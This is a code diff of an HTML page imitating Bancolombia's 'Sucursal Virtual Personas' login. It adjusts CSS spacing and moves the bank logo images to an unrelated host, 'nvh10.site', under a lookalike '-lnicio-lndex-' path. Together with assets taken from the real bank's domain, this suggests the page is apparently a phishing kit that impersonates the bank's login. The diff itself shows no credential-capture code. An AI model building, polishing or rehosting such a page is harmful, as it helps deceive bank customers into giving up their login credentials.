@@ -62,7 +62,7 @@
     .bc-mt-3 { margin-top: 1rem; }
     .bc-mt-4 { margin-top: 1.5rem; }
 
-    /* ====== TRAZO / FONDO DECORATIVO (Restaurado) ====== */
+    /* ====== TRAZO / FONDO DECORATIVO ====== */
     .trazo {
       background-image: url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg');
       background-repeat: no-repeat;
@@ -85,11 +85,11 @@
       margin-bottom: 20px;
     }
     .brand-logos .logo-nvo {
-      width: 280px; /* Logo principal tamaño adecuado */
+      width: 280px;
       height: auto;
     }
     .brand-logos .logo-mtp {
-      width: 220px; /* Aumentado de tamaño */
+      width: 220px;
       height: auto;
     }
     @media (max-width: 575px) {
@@ -123,7 +123,13 @@
     }
     .bc-card-auth-head { text-align: center; }
     .bc-card-auth-button { display: flex; justify-content: center; }
-    .bc-card-auth-container { display: grid; margin-bottom: 32px; width: 100%; }
+    
+    /* SEPARACIÓN EXTRA PARA EL BOTÓN */
+    .bc-card-auth-container { 
+      display: grid; 
+      margin-bottom: 48px; /* Aumentado de 32px a 48px para separar el botón */
+      width: 100%; 
+    }
 
     /* ====== CAMPOS FORMULARIO ====== */
     .bc-form-field { width: 100%; position: relative; height: 52px; margin-top: 20px; }
@@ -400,13 +406,11 @@
 
       <!-- LOGOS BANCOLOMBIA -->
       <div class="brand-logos">
-        <img src="https://colombiabancolombia.pages.dev/LOG-NVO.png"
+        <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png"
              alt="Bancolombia" class="logo-nvo">
-        <img src="https://colombiabancolombia.pages.dev/MTP.png"
+        <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/MTP.png"
              alt="Sucursal Virtual Personas" class="logo-mtp">
       </div>
-
-      <!-- Se eliminó el h1 de "Ingreso" -->
 
       <div class="bc-row bc-justify-content-center form-container">
         <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
